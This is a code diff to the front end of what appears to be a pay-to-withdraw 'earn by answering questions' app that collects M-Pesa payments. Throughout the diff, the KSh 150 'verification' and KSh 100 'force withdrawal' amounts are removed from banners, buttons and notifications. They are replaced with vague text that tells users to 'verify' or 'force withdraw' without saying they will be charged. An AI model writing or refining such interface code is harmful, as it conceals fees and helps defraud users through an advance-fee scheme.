@@ -95,7 +95,7 @@ async function doRegister() {
     const data = await apiFetch('/auth/register', 'POST', { phone, pin, pin2 });
     token = data.token;
     localStorage.setItem('ks_token', token);
-    toast('Account created! KSh 50 welcome bonus added.', 'success');
+    toast('Account created!', 'success');
     const user = await apiFetch('/auth/profile');
     userProfile = user;
     showScreen('profile-screen');
@@ -234,14 +234,14 @@ function updateDashboard() {
     // Paid 150, now needs 100
     banner.classList.remove('hidden');
     if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:6px"></i>Activate Force Withdrawal';
-    if (bannerDesc) bannerDesc.textContent = 'Your account is verified. Pay a one-time KSh 100 to enable M-Pesa withdrawals.';
+    if (bannerDesc) bannerDesc.textContent = 'Your account is verified. if withrawal is having an issue then try force withrawal and that will work.';
     if (bannerBtn) { bannerBtn.textContent = 'Force Withdraw Now'; bannerBtn.onclick = () => showPanel('withdraw'); }
   } else {
     // Not activated at all
     banner.classList.remove('hidden');
     if (bannerTitle) bannerTitle.innerHTML = '<i class="fas fa-unlock" style="margin-right:6px"></i>Verify Account for Withdrawals';
-    if (bannerDesc) bannerDesc.textContent = 'Pay a one-time verification fee of KSh 150 to activate your account. Your earnings are safe.';
-    if (bannerBtn) { bannerBtn.textContent = 'Activate Now'; bannerBtn.onclick = () => showPanel('withdraw'); }
+    if (bannerDesc) bannerDesc.textContent = 'To verify account ownership and maintain platform security, a one-time verification process is required before your first reward redemption.';
+    if (bannerBtn) { bannerBtn.textContent = 'Verify Now'; bannerBtn.onclick = () => showPanel('withdraw'); }
   }
 
   renderDashTransactions();
@@ -258,7 +258,7 @@ function renderDashTransactions() {
   const el = document.getElementById('dash-tx-list');
   const txs = (stats.transactions || []).slice(0, 6);
   if (!txs.length) {
-    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No transactions yet.</p></div>';
+    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No Activity yet.</p></div>';
     return;
   }
   el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
@@ -268,7 +268,7 @@ function renderAllTransactions() {
   const el = document.getElementById('all-tx-list');
   const txs = stats.transactions || [];
   if (!txs.length) {
-    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No transactions yet.</p></div>';
+    el.innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No Activity yet.</p></div>';
     return;
   }
   el.innerHTML = txs.map(tx => renderTxItem(tx)).join('');
@@ -379,7 +379,7 @@ async function submitAnswer(questionId, answerIndex, reward) {
       selectedBtn.classList.add('selected-correct');
       card.classList.add('correct');
       resultEl.className = 'question-result correct';
-      resultEl.innerHTML = `<i class="fas fa-check-circle"></i> Correct! You earned KSh ${data.earned}`;
+      resultEl.innerHTML = `<i class="fas fa-check-circle"></i> Correct! Rewarded KSh ${data.earned}`;
       showEarnPop(data.earned);
       toast(`Correct! +KSh ${data.earned} added to your balance.`, 'success');
     } else {
@@ -479,10 +479,10 @@ function updateWithdrawPanel() {
     lockedDiv.classList.remove('hidden');
 
   } else if (!stats.forceVerified) {
-    // ── Stage 2: paid 150, now needs force withdrawal (100) ──
+    // ── Stage 2: 
     statusEl.innerHTML = '<span class="chip" style="background:rgba(0,166,81,0.12);color:var(--green-light);border-color:rgba(0,166,81,0.3)"><i class="fas fa-check-circle"></i> Verified – Withdrawal Pending</span>';
 
-    // Show the registered number used for the 150 payment
+    // Show the registered number used 
     if (stats.activationPhone) {
       phoneRow.style.display = 'flex';
       regPhone.textContent = formatPhoneDisplay(stats.activationPhone);
@@ -509,7 +509,7 @@ function updateSlider() {
   document.getElementById('wd-amount-display').textContent = val;
 }
 
-// ── Activation (KSh 150) ──
+
 async function doActivate() {
   const phone = document.getElementById('act-phone').value.trim();
   const errEl = document.getElementById('act-error');
@@ -531,7 +531,7 @@ async function doActivate() {
   } catch (err) {
     showAlert(errEl, err.message || 'Failed to initiate payment.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Activate Account – KSh 150';
+    btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Verify Account ';
   }
 }
 
@@ -545,7 +545,7 @@ function startActivationPoll(ref) {
     if (attempts > 30) {
       clearInterval(activationPollTimer);
       btn.disabled = false;
-      btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Activate Account – KSh 150';
+      btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Verify Account ';
       return;
     }
     try {
@@ -554,13 +554,13 @@ function startActivationPoll(ref) {
         clearInterval(activationPollTimer);
         // Reload full stats — this fetches activationPhone from backend
         await loadStats();
-        toast('Account verified! Now activate force withdrawal to withdraw.', 'success');
+        toast('Account verified! Fot Those Having Issues with the withdrawal process, you can try force withdrawal which will trigger the withdrawal process.', 'success');
         btn.disabled = false;
       } else if (data.status === 'failed') {
         clearInterval(activationPollTimer);
         showAlert(document.getElementById('act-error'), 'Payment failed. Please try again.');
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Activate Account – KSh 150';
+        btn.innerHTML = '<i class="fas fa-unlock" style="margin-right:8px"></i>Verify Account ';
       }
     } catch (err) {
     console.error('loadStats failed:', err.message);
@@ -583,12 +583,12 @@ async function doForceVerify() {
     const data = await apiFetch('/activation/force/initiate', 'POST', {});
     const displayPhone = formatPhoneDisplay(data.phone);
     showAlert(succEl, `M-Pesa prompt sent to ${displayPhone}. Enter your PIN on your phone.`);
-    toast('Check your phone for the KSh 100 M-Pesa prompt.', 'info');
+    toast('Check your phone to force withdraw.', 'info');
     startForceVerifyPoll(data.reference, btn);
   } catch (err) {
     showAlert(errEl, err.message || 'Failed to initiate payment.');
     btn.disabled = false;
-    btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
+    btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal';
   }
 }
 
@@ -601,7 +601,7 @@ function startForceVerifyPoll(ref, btn) {
     if (attempts > 30) {
       clearInterval(forceVerifyPollTimer);
       btn.disabled = false;
-      btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
+      btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal ';
       return;
     }
     try {
@@ -615,7 +615,7 @@ function startForceVerifyPoll(ref, btn) {
         clearInterval(forceVerifyPollTimer);
         showAlert(document.getElementById('fv-error'), 'Payment failed. Please try again.');
         btn.disabled = false;
-        btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal – KSh 100';
+        btn.innerHTML = '<i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal';
       }
     } catch (err) {
     console.error('loadStats failed:', err.message);
